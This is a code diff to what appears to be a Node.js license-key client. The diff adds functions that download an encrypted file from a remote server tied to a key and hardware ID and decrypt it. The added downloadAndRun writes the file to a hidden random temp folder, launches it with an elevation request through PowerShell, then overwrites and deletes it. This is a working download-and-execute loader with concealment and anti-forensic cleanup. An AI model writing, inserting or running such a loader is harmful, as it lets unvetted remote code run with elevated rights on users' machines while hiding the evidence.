@@ -249,6 +249,128 @@ function startSessionValidation(key) {
     }, 60000);
 }
 
+function _recvExact(socket, n) {
+    return new Promise((resolve) => {
+        let buf = Buffer.alloc(0);
+        const onData = (chunk) => {
+            buf = Buffer.concat([buf, chunk]);
+            if (buf.length >= n) {
+                socket.removeListener('data', onData);
+                resolve(buf.slice(0, n));
+            }
+        };
+        socket.on('data', onData);
+        setTimeout(() => { socket.removeListener('data', onData); resolve(null); }, 30000);
+    });
+}
+
+function downloadFile(key, fileName) {
+    return new Promise((resolve) => {
+        const h = _host();
+        const options = { host: h, port: _port, servername: h, rejectUnauthorized: true };
+        const client = tls.connect(options, async () => {
+            if (!_verifyCertPin(client)) { client.end(); resolve(null); return; }
+            client.write('6');
+            await new Promise(r => setTimeout(r, 100));
+            client.write(`${PROJECT_ID}|${key}|${getHWID()}|${fileName}`);
+
+            const hdrLenRaw = await _recvExact(client, 4);
+            if (!hdrLenRaw) { client.end(); resolve(null); return; }
+            const hdrLen = (hdrLenRaw[0] << 24) | (hdrLenRaw[1] << 16) | (hdrLenRaw[2] << 8) | hdrLenRaw[3];
+            if (hdrLen > 4096) { client.end(); resolve(null); return; }
+            const hdrBytes = await _recvExact(client, hdrLen);
+            if (!hdrBytes) { client.end(); resolve(null); return; }
+            const header = hdrBytes.toString('utf8');
+            if (header.startsWith('ERROR')) { client.end(); resolve(null); return; }
+
+            const parts = header.split('|');
+            if (parts.length < 5 || parts[0] !== 'FILE') { client.end(); resolve(null); return; }
+            const nonceHex = parts[1], tagHex = parts[2], expectedHash = parts[3], fileSize = parseInt(parts[4]);
+
+            const bodyLenRaw = await _recvExact(client, 4);
+            if (!bodyLenRaw) { client.end(); resolve(null); return; }
+            const bodyLen = (bodyLenRaw[0] << 24) | (bodyLenRaw[1] << 16) | (bodyLenRaw[2] << 8) | bodyLenRaw[3];
+            if (bodyLen > 60 * 1024 * 1024) { client.end(); resolve(null); return; }
+            const body = await _recvExact(client, bodyLen);
+            client.end();
+            if (!body) { resolve(null); return; }
+
+            const nonce = Buffer.from(nonceHex, 'hex');
+            const tag = Buffer.from(tagHex, 'hex');
+            if (nonce.length !== 12 || tag.length !== 16) { resolve(null); return; }
+
+            const fileKey = crypto.createHmac('sha256', key).update('FILE_KEY:' + nonceHex).digest();
+            try {
+                const decipher = crypto.createDecipheriv('aes-256-gcm', fileKey, nonce);
+                decipher.setAuthTag(tag);
+                decipher.setAAD(Buffer.from(PROJECT_ID));
+                const dec1 = decipher.update(body);
+                const dec2 = decipher.final();
+                const plaintext = Buffer.concat([dec1, dec2]);
+                const actualHash = crypto.createHash('sha256').update(plaintext).digest('hex');
+                if (actualHash !== expectedHash || plaintext.length !== fileSize) { resolve(null); return; }
+                resolve(plaintext);
+            } catch { resolve(null); }
+        });
+        client.on('error', () => resolve(null));
+        client.on('timeout', () => { client.end(); resolve(null); });
+    });
+}
+
+function _secureWipe(filePath) {
+    const fs = require('fs');
+    try {
+        const size = fs.statSync(filePath).size;
+        const fd = fs.openSync(filePath, 'w');
+        fs.writeSync(fd, Buffer.alloc(size, 0));
+        fs.fsyncSync(fd);
+        fs.closeSync(fd);
+        fs.unlinkSync(filePath);
+    } catch { try { fs.unlinkSync(filePath); } catch { } }
+}
+
+async function downloadAndRun(key, fileName) {
+    const data = await downloadFile(key, fileName);
+    if (!data) return false;
+    try {
+        const fs = require('fs');
+        const path = require('path');
+        const { spawn } = require('child_process');
+        const tempBase = os.tmpdir();
+        const randomDir = path.join(tempBase, '_ka_' + crypto.randomBytes(4).toString('hex'));
+        fs.mkdirSync(randomDir, { recursive: true });
+
+        if (os.platform() === 'win32') {
+            try { execSync(`attrib +h +s "${randomDir}"`, { timeout: 5000 }); } catch { }
+        }
+
+        const exePath = path.join(randomDir, fileName);
+        fs.writeFileSync(exePath, data);
+
+        if (os.platform() === 'win32') {
+            try { execSync(`attrib +h "${exePath}"`, { timeout: 5000 }); } catch { }
+        }
+
+        data.fill(0);
+
+        if (os.platform() === 'win32') {
+            spawn('powershell', ['-NoProfile', '-Command',
+                `Start-Process -FilePath '${exePath}' -WorkingDirectory '${randomDir}' -Verb RunAs`],
+                { detached: true, stdio: 'ignore' }).unref();
+        } else {
+            spawn(exePath, [], { detached: true, stdio: 'ignore', cwd: randomDir }).unref();
+        }
+
+        const capExe = exePath, capDir = randomDir;
+        setTimeout(() => {
+            _secureWipe(capExe);
+            setTimeout(() => { try { fs.rmSync(capDir, { recursive: true, force: true }); } catch { } }, 1000);
+        }, 2000);
+
+        return true;
+    } catch { return false; }
+}
+
 const readline = require('readline');
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
